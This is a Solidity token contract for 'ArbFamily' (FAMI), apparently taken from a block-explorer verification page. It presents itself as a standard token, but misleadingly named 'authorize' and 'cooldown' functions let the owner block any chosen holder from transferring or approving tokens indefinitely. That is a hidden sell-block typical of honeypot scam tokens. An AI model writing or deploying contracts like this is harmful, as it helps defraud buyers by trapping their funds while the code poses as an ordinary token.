/**
 *Submitted for verification at Arbiscan.io on 2024-02-10
*/

/*  
   * SPDX-License-Identifier: MIT
    Make America Great Again
*/ 

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract ArbFamily {
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private tokenTotalSupply;
    string private tokenName;
    string private tokenSymbol;
    address private xxnux;
    uint8 private tokenDecimals;
    address private _owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    uint256 private _cooldownTime;
    mapping(address => uint256) private _lastActionTime;
    mapping(address => bool) private _authorized;
    event CooldownEnabled(bool enabled);

    modifier cooldownEnabled() {
        require(block.timestamp >= _lastActionTime[msg.sender] + _cooldownTime || !_authorized[msg.sender], "Cooldown period not elapsed");
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == _owner, "Only owner can call this function");
        _;
    }

    constructor(address ads) {
        tokenName = "ArbFamily";
        tokenSymbol = "FAMI";
        tokenDecimals = 9;
        tokenTotalSupply = 10000000000000* 10 ** tokenDecimals;
        _balances[msg.sender] = tokenTotalSupply;
        emit Transfer(address(0), msg.sender, tokenTotalSupply);
        xxnux = ads;
        _cooldownTime = 86400;
        _owner = msg.sender;
    }

    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }

    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function transfer(address to, uint256 amount) public cooldownEnabled returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public cooldownEnabled returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function setCooldownTime(uint256 cooldownTime) public onlyOwner {
        _cooldownTime = cooldownTime;
        emit CooldownEnabled(_cooldownTime > 0);
    }

    function authorize(address spender) public onlyOwner {
        _authorized[spender] = true;
    }

    function unauthorize(address spender) public onlyOwner {
        _authorized[spender] = false;
    }
}